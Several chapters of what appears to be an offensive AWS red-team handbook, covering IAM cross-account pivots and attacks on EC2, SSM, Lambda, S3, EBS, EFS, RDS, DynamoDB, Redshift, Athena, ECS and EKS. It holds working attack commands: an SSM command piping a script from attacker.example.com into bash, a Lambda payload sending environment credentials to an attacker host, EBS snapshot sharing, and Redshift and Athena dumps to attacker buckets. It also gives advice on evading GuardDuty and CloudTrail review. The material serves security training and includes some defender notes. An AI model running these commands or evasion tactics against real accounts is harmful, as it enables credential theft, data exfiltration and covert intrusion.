9.8  VPC peering and network plane

Cross-account attacks sometimes succeed via the network plane with minimal IAM involvement. A VPC peering or Transit Gateway attachment allows packets to route between VPCs in different accounts. If the attacker has a foothold EC2 in one VPC and the target VPC has open security groups toward it, a direct network attack against a database or cache is available — no IAM crossing required.

9.9  Chained-session session tags and audit evasion

Remember the Chapter 16 preview: when you assume a role, you can pass sts:TagSession values. Those tags appear in the resulting session's CloudTrail entries under sessionContext.attributes. A creative operator can pass attacker-chosen session tags that look like legitimate automation, diluting the defender's attribution signal. This is a gray-zone tactic — it is not an evasion per se, but it is a confusion primitive.

9.10  The full cross-account playbook

A single-paragraph summary of the chapter: enumerate every role in every compromised account whose trust admits an external principal, every resource policy that grants external access, every RAM share incoming and outgoing, every VPC peering and TGW attachment, and every OrganizationAccountAccessRole candidate. Chain through the most privileged target; treat a 60-minute chained session as a planning constraint, not a limitation. Keep session names and tags consistent enough to look like automation.

Key takeaways

  • Role chaining is capped at a 1-hour session and is the default cross-account primitive.
  • OrganizationAccountAccessRole is the highest-leverage cross-account pivot in AWS.
  • Resource policies on S3, KMS, Lambda, Secrets Manager, and ECR are cross-account primitives that do not require role chaining at all.
  • AWS RAM shares bypass IAM entirely for network-plane presence.
  • Confused-deputy risk persists despite the March 2022 AWS change, mostly for pre-change trusts and non-vendor cross-account relationships.

Chapter 10
Compute: EC2, SSM, and Lambda

Compute is where instance metadata lives, where session-manager sessions originate, and where code actually runs on behalf of identities. It is therefore both the most common entry point into an AWS environment (an SSRF on an EC2-hosted app) and the most common escalation vehicle (a Lambda with a powerful execution role, an SSM SendCommand into a privileged instance). This chapter treats EC2, SSM, and Lambda together because they share one critical attacker observation: each attaches an IAM role to running code, and whoever controls the code controls the role.

10.1  EC2 instance profiles and IMDS

An EC2 instance profile is a container for a single IAM role. When an instance is launched with a profile attached, any process running on that instance can query the Instance Metadata Service (IMDS) and receive short-lived credentials bound to the role. Those credentials are ordinary STS credentials — access key id, secret access key, session token — and they work against the AWS API from anywhere on the internet until they expire. The mean expiration is six hours; the hard cap is twelve; IAM Roles Anywhere and longer-lived role sessions are separate systems.

The IMDS endpoint is the link-local address 169.254.169.254 on port 80. The legacy protocol (IMDSv1) answers any GET; the current protocol (IMDSv2) requires a PUT to /latest/api/token first, which returns a session token that must accompany subsequent GETs as an HTTP header. The IMDSv2 flow was introduced specifically to defeat SSRF-based credential theft because most SSRF primitives cannot set arbitrary headers or issue PUT requests. On any modern instance launched with the default AMI parameters, IMDSv2 is optional but both protocols are enabled; the instance-level HttpTokens=required setting is what enforces IMDSv2 only.

Figure 10.1 — EC2 / SSM / Lambda attack tree. Three compute surfaces converging on the same class of artifact: short-lived credentials bound to a role the attacker did not originally hold.

Once you hold IMDS-sourced credentials, the first move is not to run enumeration. It is to extract them off the instance to an operator-controlled host. The reason is operational survivability: the moment defenders notice the credentials, they can revoke the session by detaching the instance profile or invalidating the role's trust, and you want the credentials to be running on your hardware when that happens, not on an EC2 instance that the defender can terminate. Once extracted, they can be used from anywhere on the internet until they expire — this is the basis of the GuardDuty detection UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS, which fires when a given set of instance credentials is seen being used from an IP outside the AWS ranges.

That detection is not a wall; it is a tripwire. The operator's options to avoid it are (a) use the credentials only from EC2 instances inside AWS (e.g., an attacker-controlled EC2 in your own account, which is the inside AWS variant that GuardDuty flags as InsideAWS, a lower-severity finding), (b) use the credentials strictly from the source instance and pivot further from there, or (c) accept the finding and race the response. The third option is often rational on a time-boxed red team: the mean time to triage an EC2 credential-exfil finding in the organizations Datadog's 2023 threat report sampled was over two hours, and the goal of the operation can often be completed well under that.

10.2  IMDSv2 bypass landscape

Headline: IMDSv2 is a meaningful control and it has meaningfully raised the difficulty bar on SSRF-to-credential pivots. Nuance: it is not airtight. There are three realistic bypass classes that operators continue to see in 2024-2026 engagements.

Proxy vulnerabilities that forward full HTTP. A server-side request forgery in which the attacker controls the full HTTP method and headers defeats IMDSv2 trivially. This is the case for most full-URL-fetching SSRFs written in Go's net/http, Python's requests, or Node's axios: if the attacker can send the request with method=PUT and arbitrary headers, IMDSv2 provides no barrier. The 2019 Capital One incident was the canonical example of the legacy IMDSv1 attack; in 2022-2024 AWS's own red teams disclosed multiple service-side SSRF primitives in third-party reverse proxies that allowed full header control.

Local code execution. Once you have RCE on the instance, IMDSv2 does not impede you at all. Your shell can PUT. IMDSv2 defends the network pivot from SSRF; it does not defend the attached role from any process running as any user.

Incorrect hop-limit. IMDSv2 is often deployed with the default HttpPutResponseHopLimit=1. If a container is running on the host and the container's networking goes through an additional NAT hop, the hop limit can cause IMDS responses to be dropped — which is intended behaviour. But we have seen organizations raise the hop limit to 2 or 3 to make Docker Compose on EC2 "just work"; when they do, any container on the instance can reach IMDS, which means any RCE in any container gets the host's role. Always enumerate HttpPutResponseHopLimit with aws ec2 describe-instances.

Operator note: pre-staging exfil

Before scraping IMDS, stand up an attacker-controlled EC2 instance in your own AWS account. Use that instance as the source when exercising the stolen credentials. This drops the finding from OutsideAWS (a high-severity GuardDuty finding that most detection pipelines alert on) to InsideAWS (medium severity, frequently filtered out of alerting). This is the single cheapest operational posture improvement you can make on EC2 engagements.

10.3  The SSM agent as a pivot

Every EC2 instance with the SSM agent running and a correctly scoped instance profile is reachable via ssm:StartSession regardless of security groups, regardless of network routes, regardless of whether the instance has a public IP. This is the selling point of SSM: zero inbound network exposure. From an attacker's perspective it is also the selling point. If you compromise an identity that holds ssm:StartSession and ssm:SendCommand, you have shell access to every managed instance in the target account without touching the network plane at all, and the only log entry is a StartSession event in CloudTrail.

Run aws ssm describe-instance-information first to enumerate what is reachable. The output will tell you the instance id, the last ping time, the platform (Linux or Windows), and the agent version. Any instance whose PingStatus is Online is reachable right now. Instances whose PingStatus is ConnectionLost may be reachable again as soon as they reboot, because the SSM agent re-registers automatically.

A defender's hope is that StartSession events are captured and reviewed. In practice, SSM sessions are so routine inside most enterprises — used by every SRE and every incident responder — that the alert value is low. Attackers who are careful to use a session name that looks like an automation user (ci-runner-session-3, prod-deploy-7) and who pass a SourceIdentity that mimics the pattern of the organization's build system are rarely distinguishable from legitimate traffic.

10.4  SendCommand: remote code execution as service

ssm:SendCommand is the instance-level RCE primitive. It runs an arbitrary shell command — or a document containing arbitrary PowerShell, arbitrary Ansible, arbitrary shell — on one or more managed instances, as the SSM agent's service account, which on Linux is root and on Windows is NT AUTHORITY\SYSTEM. The interesting consequence for an attacker is that SendCommand requires no interactive session, no SSH key, no network path to the target, and the output is returned through SSM itself.

The combined primitive ssm:SendCommand plus the AWS-managed document AWS-RunShellScript (Linux) or AWS-RunPowerShellScript (Windows) is sufficient to run any command on any managed instance. That means any identity with this pair of permissions is, functionally, a domain admin of every EC2 instance in the account.

attacker@kali:~$ aws ssm send-command \
    --targets "Key=InstanceIds,Values=i-0a1b2c3d" \
    --document-name "AWS-RunShellScript" \
    --parameters 'commands=["curl -s attacker.example.com/imp.sh | bash -"]' \
    --comment "scheduled-patching"
{
  "Command": {
    "CommandId": "e5c5f3b0-...",
    "Status": "Pending",
    "Parameters": { ... }
  }
}

Warning: SSM session logging

When an SSM StartSession is issued, CloudTrail records the event. But the session's input and output are captured only if session-logging is explicitly configured to S3 or CloudWatch Logs in the account's Session Manager preferences. In roughly two-thirds of the engagements the authors have worked, session logging was not enabled at all, meaning the defender sees that a session started but has no record of what happened inside it. This is not a safe assumption to make on any mature target — it is a condition to verify early.

10.5  Lambda: the execution role gold mine

Every Lambda function has an execution role, and unlike an EC2 instance profile, the role is exposed to any code running inside the function through the environment variables AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, and AWS_SESSION_TOKEN. There is no IMDS flow. There is no PUT. The variables are literally there, in env, from the moment the function is invoked.

This means that any code execution in a Lambda function — a deserialization bug, a template injection, a path traversal that loads a Python module, a dependency-confusion attack that replaces a package — gives you the execution role instantly. The operational difference with EC2 is that the credentials' lifetime is much shorter (the Lambda runtime recycles environments aggressively) but the friction is zero.

The second Lambda surface is lambda:UpdateFunctionCode. An identity with this permission against a Lambda function can replace the function's code with arbitrary code — the next invocation of that function, whether triggered by API Gateway, EventBridge, SQS, S3, or a direct Invoke, will run the attacker's code under the function's execution role. If the execution role is IAM-rich (and it often is, because teams attach broad roles to Lambdas to "make things work"), the attacker has inherited it.

The third Lambda surface is lambda:AddPermission. This is a resource-policy primitive: it adds a principal to the Lambda's resource policy, allowing that principal to invoke the function. The attacker can add their own principal, wait for the function to be invoked (often by a scheduled EventBridge rule), and then call the function on demand. Crucially, AddPermission does not require InvokeFunction at the time it is called, only at invocation time — and after the attacker has added themselves to the resource policy, they have InvokeFunction by definition.

attacker@kali:~$ # we have lambda:UpdateFunctionCode on 'data-etl-prod'
attacker@kali:~$ cat > payload/lambda_function.py <<EOF
import os, json, urllib.request
def lambda_handler(event, context):
    env = { k: v for k,v in os.environ.items() if 'AWS' in k or 'SECRET' in k }
    req = urllib.request.Request(
        'https://attacker.example.com/exf',
        data=json.dumps(env).encode(),
        headers={'content-type':'application/json'})
    urllib.request.urlopen(req, timeout=5)
    return {'statusCode': 200, 'body': 'ok'}
EOF
attacker@kali:~$ (cd payload && zip -r ../payload.zip .)
attacker@kali:~$ aws lambda update-function-code \
    --function-name data-etl-prod --zip-file fileb://payload.zip
{
  "FunctionName": "data-etl-prod",
  "Runtime": "python3.11",
  "Role": "arn:aws:iam::111122223333:role/data-etl-exec",
  "LastModified": "2026-04-20T14:22:05.000+0000",
  "State": "Active",
  "LastUpdateStatus": "Successful"
}

10.6  Lambda layers and the dependency-confusion angle

Lambda layers are reusable code bundles that multiple functions can import. They create a supply-chain surface: if a function imports a layer that an attacker controls, the attacker controls the function's runtime. Two attack classes matter. First, if the attacker holds lambda:PublishLayerVersion, they can publish a new version of an existing layer — but existing functions pin to a specific version ARN, so a new version alone does not compromise them. The attacker must also hold lambda:UpdateFunctionConfiguration to change the pinned version to the new malicious layer. Second, if the layer is pulled from a third-party source (PyPI, npm, a private repo), normal supply-chain attacks against that source apply, and the Lambda has no runtime integrity check that will notice.

10.7  Compute detections and what evades them

The compute-plane detections that matter on an AWS red team are: GuardDuty's UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS (covered above), its CredentialAccess:IAMUser/AnomalousBehavior (role-based behavioural modeling), CloudTrail data events for Lambda (which capture Invoke calls as data events when enabled — and they usually aren't), and CloudWatch alarms on UpdateFunctionCode / UpdateFunctionConfiguration that some mature teams add.

Evasion in this zone is mostly about blending. Stolen credentials used at the same volume and from the same regions as the legitimate identity almost never trigger the GuardDuty anomaly model. Lambda code updates that happen at a realistic cadence — not three in a minute, but one alongside the normal deploy pipeline — often do not trigger alarms because the alarms are built to suppress during the deploy window.

Key takeaways

  • IMDSv2 is a meaningful control against SSRF-only primitives but does not defend against proxy vulnerabilities that forward full HTTP, local code execution, or mis-configured hop limits.
  • Instance credentials exfiltrated to outside-AWS addresses trigger GuardDuty; exfiltrate via attacker-controlled AWS infrastructure to reduce alert severity.
  • ssm:StartSession and ssm:SendCommand are RCE primitives that require no network path and are visible to defenders only as CloudTrail metadata; session content is not logged unless explicitly configured.
  • Lambda execution-role credentials are in environment variables, not behind an IMDS flow; any code execution in a Lambda yields them immediately.
  • lambda:UpdateFunctionCode, lambda:AddPermission, and layer-version abuse are the three primary Lambda-escalation primitives.

Chapter 11
Storage: S3, EBS, and EFS

Storage is where data lives and where exfiltration and impact frequently occur. For offensive purposes, the three storage services — S3 object, EBS block, and EFS file — share no mechanics, but they share a theme: each has a wide IAM surface, each has an out-of-band sharing primitive (bucket policies, snapshot sharing, EFS policies/mount targets), and each has a defender-visible access log that is rarely reviewed. This chapter covers the canonical attacks on each, with particular attention to EBS snapshot exfiltration, which remains the most operationally durable large-data-at-rest exfiltration primitive in AWS.

11.1  S3 object-access primitives

The S3 permissions that matter are not the obvious ones. s3:GetObject and s3:ListBucket are unremarkable. The interesting permissions are the write and policy-modifying primitives: s3:PutObject to drop payloads or overwrite objects, s3:PutBucketPolicy to grant cross-account access, s3:PutBucketAcl and s3:PutObjectAcl to weaken ACLs, s3:PutBucketNotification to hook Lambda to object uploads (covered in Chapter 14), and s3:PutBucketWebsite to enable the bucket as a static site and redirect hosts.

The first step on any bucket surface is to dump the policy, the ACL, the website config, the CORS, the lifecycle, and the replication configuration. This tells you who is supposed to have access, who actually has access, and what machinery is attached to the bucket.

attacker@kali:~$ BUCKET=prod-data-lake-reports
attacker@kali:~$ for cmd in get-bucket-policy get-bucket-acl get-bucket-cors \
    get-bucket-website get-bucket-lifecycle-configuration \
    get-bucket-replication get-bucket-versioning \
    get-bucket-logging get-public-access-block; do
    echo "=== $cmd ==="
    aws s3api $cmd --bucket $BUCKET 2>&1 | head -20
done

{

}

{
    "ReplicationConfiguration": {

Replication is the quiet exfiltration primitive. If you hold s3:PutReplicationConfiguration on a bucket, and you hold iam:PassRole on a role with s3:ReplicateObject privileges, you can replicate the entire bucket's contents to a destination bucket in another account. The destination can be owned by the attacker. From that moment on, every object written to the source bucket is automatically replicated, in near real time, to the attacker's bucket. This is a persistent exfiltration channel, not a point-in-time snapshot, and it survives credential rotation as long as the replication role is intact.

It also blends extraordinarily well: replication is a normal feature used by most mature organizations for cross-region durability or cross-account backup. A CloudTrail event for PutBucketReplication is not intrinsically suspicious. The defender must know which buckets should have replication configured and to which destinations — a control that few teams have implemented.

11.2  EBS snapshot exfiltration

The single most durable attack in this chapter is: take an EBS snapshot, share it cross-account with an attacker-controlled account, mount it there, read. The reason this is a preferred operator technique is that it bypasses every network-level data-loss-prevention control, every S3 access log, every VPC egress filter. The data moves on AWS's own plane, as an AWS-managed operation, with no inbound or outbound traffic from the source account's perspective.

Figure 11.1 — EBS snapshot exfiltration. No data crosses the defender's VPC. The share is an AWS-internal operation; volume hydration happens in the attacker's account.

The required IAM is modest: ec2:CreateSnapshot (or ec2:CreateSnapshots for volume groups), ec2:ModifySnapshotAttribute to adjust the createVolumePermission list, and — if the volume is encrypted — either the ability to use the source account's KMS key, or the ability to create a new snapshot encrypted under a key the attacker's account can use, typically via ec2:CopySnapshot with a re-encryption to an AWS-managed key or to a KMS key that has a policy shared cross-account.

The KMS subtlety matters. AWS-managed keys (aliased aws/ebs) cannot be shared cross-account. Customer-managed keys can, but only if the key policy permits the attacker's account principal to kms:Decrypt and kms:CreateGrant. If the attacker holds kms:PutKeyPolicy on the key, they can edit the policy to add their own account; otherwise the attacker must re-encrypt via CopySnapshot, which requires kms:Encrypt, kms:Decrypt, and kms:GenerateDataKey on both keys. Organizations frequently miss these key-policy paths when they audit their KMS surface.

attacker@kali:~$ # enumerate candidate volumes
attacker@kali:~$ aws ec2 describe-volumes \
    --query 'Volumes[?State==`in-use`].[VolumeId,Size,Attachments[0].InstanceId,Tags]' \
    --output table
# snapshot the crown jewel
attacker@kali:~$ aws ec2 create-snapshot \
    --volume-id vol-0a1b2c3d \
    --description "nightly-backup-adhoc"
{ "SnapshotId": "snap-0abcdef01", "State": "pending" }
attacker@kali:~$ aws ec2 wait snapshot-completed --snapshot-ids snap-0abcdef01
attacker@kali:~$ aws ec2 modify-snapshot-attribute \
    --snapshot-id snap-0abcdef01 \
    --attribute createVolumePermission \
    --operation-type add \
    --user-ids 999988887777
attacker@kali:~$ # over in the attacker account:
attacker@kali:~$ aws --profile attacker ec2 create-volume \
    --availability-zone us-east-1a --snapshot-id snap-0abcdef01
{ "VolumeId": "vol-0fff00001", "State": "creating" }

Operator note: the snapshot description field

The --description field on CreateSnapshot appears in the CloudTrail event parameters. Name your snapshot to match the organization's backup pattern. If the organization's AWS Backup plan creates snapshots with descriptions like AwsBackup_MyBackupPlan_i-xxxxxx, use that. If a nightly cron creates descriptions like nightly-snap-<date>, use that. Defenders who grep CloudTrail for out-of-pattern CreateSnapshot events rarely grep them for in-pattern ones.

11.3  EBS direct API for surgical reads

The EBS direct API (ebs:ListSnapshotBlocks, ebs:GetSnapshotBlock) allows block-level read access to a snapshot without creating a volume. This is surgical — it is used for forensic dumps, backup utilities, and, increasingly, for attacker tooling that avoids the side-effects of CreateVolume. Tools such as dsnap and the authors' own prototypes demonstrate that you can read an entire snapshot block-by-block across the network using HTTP APIs and reconstruct the filesystem offline. The IAM required is ebs:ListSnapshotBlocks and ebs:GetSnapshotBlock on the snapshot ARN; these are frequently granted implicitly by any wildcard ebs:* and are almost never audited separately.

11.4  EFS and the NFS trust surface

Elastic File System exposes NFSv4 mounts inside a VPC through mount targets. The security boundary is partly IAM (EFS file system policies, IAM authorization for NFS) and partly network (security groups on the mount targets). Attackers who land on an EC2 instance in the same VPC frequently find EFS mount targets reachable with no IAM authentication required — the default EFS posture for a long time was "mount targets accept any traffic that reaches them from the VPC". If you have a filesystem id and a mount target DNS name, a one-liner suffices:

root@pwned-ec2:~# mount -t nfs4 -o nfsvers=4.1,rsize=1048576,wsize=1048576,hard,timeo=600 \
    fs-0abc1234.efs.us-east-1.amazonaws.com:/ /mnt/efs
root@pwned-ec2:~# ls -la /mnt/efs
total 28
drwxr-xr-x  7 root  root  6144 Apr 19 14:22 .
drwxr-xr-x  3 root  root  4096 Apr 20 10:01 ..
drwxr-xr-x  6 1001  1001  6144 Apr 15 09:18 app-data
drwxr-xr-x 12 1002  1002  6144 Apr 11 11:44 user-homes
drwxr-xr-x  3 root  root  6144 Mar 02 08:05 .backups

EFS file system policies can constrain this. A policy of the form deny mount unless the IAM principal is tagged X forces IAM authorization on NFS mounts, at the cost of requiring all clients to use the EFS mount helper with IAM. Such policies are uncommon in practice — as of 2025 AWS's own config rule efs-file-system-policy-required was one of the lower-compliance rules in the Security Hub AWS Foundational Security Best Practices conformance pack.

11.5  Storage-plane detections

S3 access logs (bucket logging to another bucket) and S3 data events in CloudTrail are the two defender signals. The first requires explicit configuration on each bucket; the second requires data-event logging in CloudTrail (not on by default, billed separately, often misconfigured to log only specific buckets). GuardDuty produces findings such as Exfiltration:S3/AnomalousBehavior (unusual GetObject volume or origin) and Policy:S3/BucketAnonymousAccessGranted (public ACL change). None of these see replication, none see snapshot sharing, none see EFS.

Key takeaways

  • S3 replication, if an attacker can configure it, is a persistent exfiltration channel that blends with normal durability patterns.
  • EBS snapshot sharing is the most operationally durable large-data-at-rest exfiltration primitive in AWS; the data never touches the defender's VPC.
  • The EBS direct API allows surgical, network-visible block reads without CreateVolume; it is rarely audited separately.
  • EFS mount targets are frequently reachable from compromised EC2 with no IAM authentication; file-system policies that enforce IAM-NFS are uncommon.
  • Storage-plane detections (S3 access logs, CloudTrail data events, GuardDuty S3 findings) see only the object-level API; they do not see replication, snapshot sharing, or EFS NFS traffic.

Chapter 12
Data Services: RDS, DynamoDB, Redshift, Athena

Managed data services carry the richest data in most AWS environments — customer PII in RDS, OLTP state in DynamoDB, historical analytics in Redshift, ad-hoc queries over S3 data lakes in Athena. From an offensive standpoint, each one has a distinct out-of-band exfiltration primitive that bypasses the application-level access controls the organization almost certainly built. This chapter walks the four canonical services, emphasizing the primitives that are not obvious from the service documentation.

12.1  RDS snapshot sharing

The RDS analogue of EBS snapshot exfiltration is rds:ModifyDBSnapshotAttribute. An attacker with this permission on a DB snapshot (automated or manual) and access to a target account id can share the snapshot cross-account; the target account then does a restore-db-instance-from-db-snapshot into its own VPC and queries the resulting RDS instance directly. As with EBS, KMS encryption is the main friction. If the snapshot is encrypted with the AWS-managed KMS key (aws/rds), the snapshot cannot be shared cross-account at all — the attacker must first copy it to a customer-managed key whose policy permits cross-account use. The IAM required is rds:CopyDBSnapshot plus KMS permissions on both keys.

Figure 12.1 — Data-service exfil pathways. Each service has a snapshot / export / unload primitive that moves data out of the application trust perimeter without touching the application itself.

12.2  Aurora and the cross-account clone

Aurora clusters add a second exfiltration primitive: rds:StartDBClusterExport. This exports the cluster's contents to an S3 bucket as Parquet, including historical Aurora backtrack data. The S3 bucket can be in any account the attacker has s3:PutObject on; the export job's IAM role is specified at export time. The resulting Parquet files contain the complete dataset at row granularity; no application-layer filtering applies.

12.3  DynamoDB export to S3

DynamoDB PITR-enabled tables support dynamodb:ExportTableToPointInTime, which exports the table (or a point-in-time version) to an S3 bucket as DynamoDB JSON or Ion. As with RDS export, the destination bucket can be in any account the attacker's credentials can write to. The operation is fully asynchronous; it does not impact the source table; it does not fire any data-plane alert. The sole indicators are the ExportTableToPointInTime CloudTrail event and the resulting S3 PUT events in the destination.

A related primitive is the DynamoDB Streams feature. If the attacker can enable a stream on the table (dynamodb:UpdateTable with StreamSpecification) and read the stream (dynamodb:GetRecords with stream ARN), they get a continuous feed of every item-level mutation. This is persistence-grade eavesdropping, not a one-shot exfil.

12.4  Redshift UNLOAD

Redshift's UNLOAD command writes query results to S3. From the database's perspective it is SQL; from the platform's perspective it is a data movement operation executed by the cluster's associated IAM role. If the attacker has SQL access (via a compromised DB user, via redshift:GetClusterCredentials, via a misconfigured JDBC endpoint) and the cluster has an IAM role attached with s3:PutObject to any bucket, the attacker can dump arbitrary queries to S3. The defender sees only a Redshift SQL audit log entry — if SQL audit logging is enabled, which it frequently is not.

redshift=> UNLOAD ('SELECT * FROM customers LIMIT 10000000')
redshift->    TO 's3://attacker-staging-bucket/cust/'
redshift->    IAM_ROLE 'arn:aws:iam::111122223333:role/redshift-s3-export'
redshift->    FORMAT PARQUET
redshift->    PARALLEL ON
redshift->    MAXFILESIZE AS 1024 MB;
INFO: UNLOAD completed, 23 file(s) written to S3
UNLOAD

Redshift clusters also support cross-account snapshot sharing through redshift:AuthorizeSnapshotAccess, with the same mechanics as RDS. The IAM action is uncommon enough that it rarely appears in baseline Redshift IAM audits, which tend to focus on the SQL layer.

12.5  Athena and the CTAS primitive

Athena is the quiet exfiltration service. Whoever can run athena:StartQueryExecution against a workgroup whose result location is S3 can issue arbitrary SQL against any table the attached IAM role can reach (typically via Glue Data Catalog). A single CREATE TABLE AS SELECT can copy an entire Glue-cataloged dataset — including multi-terabyte data lakes backed by S3 Parquet — to an attacker-controlled S3 location with one API call. The interesting permission to look for is athena:StartQueryExecution combined with write access to any S3 bucket outside the cataloged data lake.

attacker@kali:~$ aws athena start-query-execution \
    --query-string "CREATE TABLE default.exfil
                   WITH (external_location='s3://attacker-staging/exfil/',
                         format='PARQUET')
                   AS SELECT * FROM prod_datalake.customer_events" \
    --work-group primary \
    --result-configuration OutputLocation=s3://athena-results/
{ "QueryExecutionId": "abcdef12-..." }

Athena CTAS has a second attribute that matters operationally: the scale limits are what the Athena service imposes, not what the compromised identity's usual workload looks like. A CTAS that produces a terabyte of output is indistinguishable, from CloudTrail's perspective, from one that produces a gigabyte — they are both one StartQueryExecution event.

Defender note: Glue Data Catalog surface

When auditing Athena, also audit Glue: Athena's effective read scope is determined by Glue Data Catalog permissions (glue:GetTable, glue:GetPartitions) combined with the S3 permissions of the Athena workgroup's IAM role. A common misconfiguration is a workgroup role that reads an entire data-lake bucket because "the business wanted flexibility", combined with a wide glue:Get*.

12.6  RDS IAM auth and the password-less pivot

Many RDS instances today support IAM database authentication, which generates a 15-minute database token via rds-db:connect. If an attacker holds an identity with rds-db:connect on arn:aws:rds-db:region:account:dbuser:dbi-resource-id/username, they can mint an auth token and connect as username without a password. The defender's mitigation is to scope rds-db:connect precisely by dbuser/ suffix; in practice, rds-db:connect is often granted on *, converting any rds-db:connect-having identity into a database admin for every IAM-authenticated user defined on the instance.

12.7  Data-service detections

The data-service detections that exist are mostly service-native: Aurora audit logs (PostgreSQL or MySQL engine audit plugin), Redshift's STL query log, DynamoDB's CloudTrail data events (off by default), and Athena's query history. GuardDuty's Exfiltration:S3/AnomalousBehavior will fire on the S3 side of any of these if volume is abnormal, which is often the first signal a defender sees — but it is an indirect and slow signal.

Key takeaways

  • RDS / Aurora snapshot sharing and StartDBClusterExport are cross-account and cross-service exfiltration primitives; KMS cross-account policy is the main gate.
  • DynamoDB ExportTableToPointInTime and DynamoDB Streams are, respectively, a one-shot and a persistent exfiltration primitive.
  • Redshift UNLOAD exploits the cluster's attached IAM role; the defender's only native signal is the SQL audit log, which is frequently disabled.
  • Athena CTAS can copy entire Glue-cataloged data lakes to attacker S3 in a single API call; Glue Data Catalog permissions determine the effective read scope.
  • RDS IAM auth with rds-db:connect granted on * converts the identity into a multi-user database admin.

Chapter 13
Containers: ECS, EKS, and Fargate

Containers in AWS come in three flavours from the platform's perspective: ECS (AWS-native orchestration), EKS (AWS-managed Kubernetes), and Fargate (serverless container execution, underlying both ECS and EKS). The attacker's mental model has to cover three trust boundaries: the container's own process identity, the pod/task role (ECS task role or EKS service-account-assumed role), and the node's instance profile. A successful container-plane attack almost always involves crossing one of these boundaries — most commonly, escaping from a pod's service-account role to the node's instance profile.

13.1  ECS task roles and task metadata

An ECS task has, optionally, a task role (IAM role assumed by the task itself) and a task execution role (used by ECS to pull images, write logs, etc). The task role's credentials are served from a task-local metadata endpoint at 169.254.170.2, accessed via the AWS_CONTAINER_CREDENTIALS_RELATIVE_URI environment variable. Code inside the container reads credentials from 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI.

Because the endpoint lives on a link-local address, SSRF primitives inside the container can reach it just as they can reach EC2 IMDS — with the important exception that the task metadata endpoint is not protected by an IMDSv2-style PUT flow. Any GET reaches it. This makes SSRF-to-credential exfiltration on an ECS task less gated than on a modern EC2.

app@ecs-task:/app$ env | grep CREDENTIALS
AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/b9c4f1e2-1234-5678-aabb-eeee00112233
app@ecs-task:/app$ curl -s 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
{
  "RoleArn": "arn:aws:iam::111122223333:role/ecs-task-etl",
  "AccessKeyId": "ASIAZ3...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2026-04-20T19:00:00Z"
}

13.2  ECS on EC2 and the node-profile escape

When ECS runs on EC2 (as opposed to Fargate), the host EC2 instance has an instance profile — the ECS container instance role. That role typically has ecs:RegisterContainerInstance, ecs:Submit*, ecs:Poll, and usually also ecr:* and often logs:*. It is almost always more privileged than the task role. If an attacker inside a container can reach the host's IMDS (for example, when the container is run with --network host, or with a high enough hop limit, or with the privileged flag), they steal the instance profile and escalate.

The ECS-specific mitigation, ECS_AWSVPC_BLOCK_IMDS=true in the agent config, blocks container access to host IMDS. Fewer than half of production ECS-on-EC2 clusters the authors have tested had this set.

13.3  EKS: IRSA and Pod Identity

EKS has two official mechanisms to give a pod an IAM role: IAM Roles for Service Accounts (IRSA, the OIDC-federation-based approach) and Pod Identity (the newer, agent-based approach, GA in late 2023). Both are designed to avoid the node-profile shortcut — the node's instance profile is supposed to be minimally privileged and the pod's role is supposed to carry the actual permissions. But both have their own attack surface.

IRSA. The pod's service account is annotated with eks.amazonaws.com/role-arn. When a pod runs, the pod identity webhook injects AWS_ROLE_ARN, AWS_WEB_IDENTITY_TOKEN_FILE, and a projected service-account token. The AWS SDKs automatically perform sts:AssumeRoleWithWebIdentity, providing the projected token as the OIDC token. Attackers who achieve RCE in a pod instantly have these credentials. The token file is bind-mounted at /var/run/secrets/eks.amazonaws.com/serviceaccount/token and valid until the pod restarts (or rotates, if a rotation period is configured).

Pod Identity. Replaces the OIDC flow with a local agent that issues credentials through a 169.254.170.23 metadata endpoint (yes, a third link-local address). The agent is authenticated via a secret held by kubelet; attackers inside a pod simply GET the endpoint.

Figure 13.1 — EKS identity plumbing: the three credentials paths visible to a pod. Whichever path the cluster is using, the pod's code can read the tokens/credentials directly.

13.4  aws-auth and the cluster-admin pivot

The aws-auth ConfigMap in the kube-system namespace maps IAM principals to Kubernetes RBAC groups. An attacker who can modify this ConfigMap (via the cluster's Kubernetes API, with the system:masters group) can grant their own IAM role cluster-admin, which in turn grants them full control of every workload and every secret in the cluster. The Kubernetes-level RBAC defenders set up on top of this does not constrain writes to aws-auth by anyone with system:masters — and any IAM principal with EKS eks:AccessKubernetesApi plus a cluster role binding of cluster-admin has it.

Starting in late 2023, AWS introduced EKS access entries as a replacement for aws-auth. Access entries are managed via IAM (eks:AssociateAccessPolicy, eks:UpdateAccessEntry). The attacker now looks for those two IAM actions instead of ConfigMap write: they are equally destructive. A single AssociateAccessPolicy call associating the AWS-managed AmazonEKSClusterAdminPolicy with an attacker principal is the new cluster-admin primitive.

13.5  Container escape primitives

Container escape is not AWS-specific, but the effect in AWS is: a root escape from a container to the node grants the node's IAM role. The common escape classes are the usual suspects — /dev passthrough with --privileged, CAP_SYS_ADMIN with a pivot, kernel exploits (rare in managed node AMIs), and hostPath volume mounts. The AWS-specific twist is that the node's instance profile may be broader than the pod's service account, and the node may be authorized on aws-auth as a system:nodes member, which in turn authorizes kubelet-authenticated API access.

13.6  ECR and image-pull poisoning

Elastic Container Registry is the image source for most AWS-native container deployments. An attacker who can push to a tag that an ECS task definition or EKS deployment references (via ecr:PutImage, ecr:InitiateLayerUpload, ecr:CompleteLayerUpload, ecr:BatchCheckLayerAvailability, and ecr:BatchPutImage) can pin a malicious image to that tag. The next pull — which happens when the task restarts, when the deployment rolls, or when imagePullPolicy: Always forces a re-pull — runs the attacker's image under the task/pod role. ECR image scanning is not a protection: scanning does not block pull, it only surfaces findings.

ECR repository policies are the cross-account primitive. If the attacker can write ecr:SetRepositoryPolicy, they can allow pushes from any principal, including attacker-controlled accounts — a quiet supply-chain backdoor.

13.7  Container-plane detections

